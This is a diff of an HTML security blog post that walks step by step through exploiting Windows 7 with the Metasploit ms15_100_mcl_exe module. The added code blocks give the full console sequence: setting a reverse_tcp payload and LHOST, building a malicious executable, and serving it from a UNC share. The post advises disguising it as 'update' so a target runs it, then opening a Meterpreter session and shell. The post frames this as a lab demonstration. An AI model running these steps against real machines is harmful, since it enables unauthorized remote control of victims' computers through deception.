@@ -14,6 +14,7 @@
         <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
         <!-- Core theme CSS (includes Bootstrap)-->
         <link href="css/styles.css" rel="stylesheet" />
+        <link href="css/paraiso-dark.css" rel="stylesheet" type="text/css">
     </head>
     <body>
         <!-- Navigation-->
@@ -70,9 +71,9 @@
                             simply do not want to update to a newer Windows version as well as businesses who do not want 
                             to waste time on the large scale transition to a new system. 
                         </p>
-                        
+                        <!--
                         <div id="desktop-windows_version-ww-monthly-201912-202109" width="600" height="400" style="width:600px; height: 400px;"></div><p>Source: <a href="https://gs.statcounter.com/windows-version-market-share/desktop/worldwide/#monthly-201912-202109">StatCounter Global Stats - Windows Version Market Share</a></p><script type="text/javascript" src="https://www.statcounter.com/js/fusioncharts.js"></script><script type="text/javascript" src="https://gs.statcounter.com/chart.php?desktop-windows_version-ww-monthly-201912-202109&chartWidth=600"></script>
-                        
+                        -->
                         <p>From the data and graph from <a href="https://gs.statcounter.com/">StatCounter</a> we can see that as of September 2021, roughly 16% of Windows users are still running Windows 7.</p>
                         
                         <h3>Exploits Waiting to Happen</h3>
@@ -104,22 +105,26 @@
                             and against a Windows 7 Ultimate machine.
                         </p>
                         
-                        <p> <b>Step 1: </b>Once you have Metasploit open in he console, use the search command to find the exploit as such: <br>
-                            
+                        <p> <b>Step 1: </b> Once you have Metasploit open in he console, use the search command to find the exploit as such:
+                            <pre><code data-language="shell">search ms15_100_mcl_exe</code></pre>
                             <img class="img-fluid" src="assets/post2pics/post2walkthrough (1).PNG" alt="..." />                           
                         </p>
 
-                        <p> <b>Step 2: </b>After hitting "Enter" you should see the results of this search displayed. If the search is empty, double check your spelling and try again. 
+                        <p> <b>Step 2: </b>After hitting "Enter" you should see the results of this search displayed. It should look something like in the picture by Step 4. If the search is empty, double check your spelling and try again. 
                             
                             <br><br><b>Step 3: </b>Once the results of the search are displayed, highlight the path in the console, right-click it and copy it to the clipboard.
                             
-                            <br><br><b>Step 4: </b>Then type "use" into the command line and paste the selection again via right-clicking. Your screen should now look similar to this:
+                            <br><br><b>Step 4: </b>Then type "use" into the command line and paste the selection again via right-clicking. 
+                            <pre><code data-language="shell">use exploit/windows/fileformat/ms15_100_mcl_exe</code></pre>
+                            Your screen should now look similar to this:
                             
                             <img class="img-fluid" src="assets/post2pics/post2walkthrough (2).PNG" alt="..." />
                             The command line should now reflect that you are using the ms15_100_mcl_exe exploit as shown in the image above by the red section in the last line.
+                            <pre><code data-language="shell">msf6  exploit(windows/fileformat/ms15_100_mcl_exe) > </code></pre>
                         </p>
 
-                        <p> <b>Step 5: </b> By typing "info" into the command line, the information of this exploit is shown - items such as what the .exe and .mcl file are named as. 
+                        <p> <b>Step 5: </b> By typing "info" into the command line, the information of this exploit is shown - items such as what the .exe and .mcl file are named as.
+                            <pre><code data-language="shell">msf6  exploit(windows/fileformat/ms15_100_mcl_exe) > info </code></pre>
                             <img class="img-fluid" src="assets/post2pics/post2walkthrough (3).PNG" alt="..." />
                             <br><br> As you can see, the files are currently only named msf.mcl and msf.exe. This is now where we must employ some form of deception.
                         </p>
@@ -127,24 +132,33 @@
                         <p> <b>Step 6: </b> Rename the files using the "set" command as shown in the image below where "x" is the name you can give the file. The "set" command works as follows:
                             <br> set "name_of_what_to_set" "what_to_change_to"
                             <br> Take note of the space between each word!
+                            <pre><code data-language="shell">msf6  exploit(windows/fileformat/ms15_100_mcl_exe) > set FILENAME x.mcl</code></pre>
+                            <pre><code data-language="shell">msf6  exploit(windows/fileformat/ms15_100_mcl_exe) > set FILE_NAME x.exe</code></pre>
                             <img class="img-fluid" src="assets/post2pics/post2walkthrough (4).PNG" alt="..." />
                             For this demonstration, we will call these files "update" and the reason for this is because we want the target to open a .exe file and considering most people nowadays think twice about clicking on files labeled "worksheet.pdf.exe" it needs to look somewhat legitimate.
                         </p>
 
                         <p> <b>Step 7: </b> Set the payload and local host address. 
                             To set the payload we again use the "set" method followed by "PAYLOAD" 
-                            and then the path to the payload we wish to use. The local host address is done in the same way using "set LHOST x".
+                            and then the path to the payload we wish to use. 
+                            <pre><code data-language="shell">msf6  exploit(windows/fileformat/ms15_100_mcl_exe) > set PAYLOAD windows/reverse_tcp</code></pre>
+                            The local host address is done in the same way using "set LHOST x.x.x.x".
+                            <pre><code data-language="shell">msf6  exploit(windows/fileformat/ms15_100_mcl_exe) > set LHOST x.x.x.x</code></pre>
                             <img class="img-fluid" src="assets/post2pics/post2walkthrough (5.1).PNG" alt="..." />
                             <br><br> To find the correct address to use, you must open a new terminal and type "ifconfig" and look for the address at "inet".
+                            <pre><code data-language="shell"> ifconfig</code></pre>
                             <img class="img-fluid" src="assets/post2pics/post2walkthrough (5.2).PNG" alt="..." />
                         </p>
                         <p> <b>Step 8: </b> Compile everything needed by typing "exploit" into the console.
+                            <pre><code data-language="shell">msf6  exploit(windows/fileformat/ms15_100_mcl_exe) > exploit</code></pre>
                             <img class="img-fluid" src="assets/post2pics/post2walkthrough (6).PNG" alt="..." />
                             <br><br> This should result in the following screen.
                             <img class="img-fluid" src="assets/post2pics/post2walkthrough (7.1).PNG" alt="..." />
                             <br><br> To double check that everything is ready, in a <b>new</b> terminal, move into the highlighted directory in the previous image
                             through the use of the "cd" command. Take note of where the directory ends - we want to view the contents of the folder where the file is.
+                            <pre><code data-language="shell"> cd home/kali/.msf4/local</code></pre>
                             Then use the command "ls" to list the contents in the folder and look if the .mcl file is present. Since ours is named update, we can see it has been created.
+                            <pre><code data-language="shell"> ls</code></pre>
                             <img class="img-fluid" src="assets/post2pics/post2walkthrough (7.2).PNG" alt="..." />
                         </p>
 
@@ -159,8 +173,9 @@
                             and may seem legitimate at first.
                             
                             <br><br> On the same screen as before, look for the "Malicious executable at ..." section. It has been highlighted in the following image to help.
-                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (8).PNG" alt="..." />
-                            <br><br>This is the address where our update.exe can be downloaded and installed from.
+                            <img class="img-fluid" src="assets/post2pics/post2walkthrough (8).PNG" alt="..." /> <br><br>
+                            <pre><code data-language="shell">\\192.168.64.128\JRkot\update.exe</code></pre>
+                            This is the address where our update.exe can be downloaded and installed from.
                             (PS - <b>DO NOT</b> install this on your personal computer. It's called malicious for a reason!)
                             
                             <br><br> This is the point where we now open the Windows machine 
@@ -175,17 +190,21 @@
                             and as such is typically ignored anyway.
 
                             <br><br> Once the target has installed the .exe file, the Metasploit console should have the following updates appear:
-                            <br> [*] Sending stage (x bytes) to x.x.x.x.x
-                            <br> [*] Meterpreter session x opened (x.x.x.x:x -> x.x.x.x:x) at x-x-x x:x:x -xxxx
-                            <br> With the x's representing numbers/information that will change. In the demonstration it looks like:
+                            
+                            <pre><code data-language="shell"> [*] Sending stage (x bytes) to x.x.x.x.x</code></pre>
+                            
+                            <pre><code data-language="shell"> [*] Meterpreter session x opened (x.x.x.x:x -> x.x.x.x:x) at x-x-x x:x:x -xxxx</code></pre>
+                            With the x's representing numbers/information that will change. In the demonstration it looks like:
                             <img class="img-fluid" src="assets/post2pics/post2walkthrough (11).PNG" alt="..." />
                         </p>
 
                         <p> <b>Step 10: </b> Start a session and gain access to the exploited machine.
                             <br> First, we need to get the session id of our newly exploited machine which can be done by typing the "sessions" command in console.
+                            <pre><code data-language="shell">msf6  exploit(windows/fileformat/ms15_100_mcl_exe) > sessions</code></pre>
                             <img class="img-fluid" src="assets/post2pics/post2walkthrough (12).PNG" alt="..." />
                             <br><br>We can see that the new machine is listed as session 1. We then type "sessions -i 1" into the console to gain access.
                             <i>Take note: the "-i" is vital to this command as it stipulates that the console should connect to the supplied session_id (in this case 1).</i>
+                            <pre><code data-language="shell">msf6  exploit(windows/fileformat/ms15_100_mcl_exe) > sessions -i x</code></pre>
                             <img class="img-fluid" src="assets/post2pics/post2walkthrough (14).PNG" alt="..." />
                         </p>
 
@@ -193,11 +212,16 @@
 
                         <p> <b>Step 10: </b> Cause Havoc!
                             <br> By typing "help" in the meterpreter console (it is the same one as before) lists of possible commands are given.
-                            <br>For example, we made use of the "sysinfo" command to see the systems information. 
-                            <br>The "localtime" to see what time the computer is set to.
-                            <br>The "idletime" to see how long the system's user has left it alone.
-                            <br>The "shell" command opens up a command prompt in our console that will execute command on tha system!
-                            <br>The outputs of each of these are shown below.
+                            <pre><code data-language="shell"> meterpreter > help </code></pre>
+                            For example, we made use of the "sysinfo" command to see the systems information. 
+                            <pre><code data-language="shell">meterpreter > sysinfo </code></pre>
+                            The "localtime" to see what time the computer is set to.
+                            <pre><code data-language="shell">meterpreter > localtime </code></pre>
+                            The "idletime" to see how long the system's user has left it alone.
+                            <pre><code data-language="shell">meterpreter > idletime </code></pre>
+                            The "shell" command opens up a command prompt in our console that will execute command on the system!
+                            <pre><code data-language="shell">meterpreter > shell </code></pre>
+                            The outputs of each of these are shown below.
                             <img class="img-fluid" src="assets/post2pics/post2walkthrough (15).PNG" alt="..." />
 
                             <br><br> You'll notice we typed "calc" in the command prompt before closing it with Ctrl+C. 
@@ -254,5 +278,6 @@
         <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js"></script>
         <!-- Core theme JS-->
         <script src="js/scripts.js"></script>
+        <script src="js/rainbow-custom.min.js"></script>
     </body>
 </html>
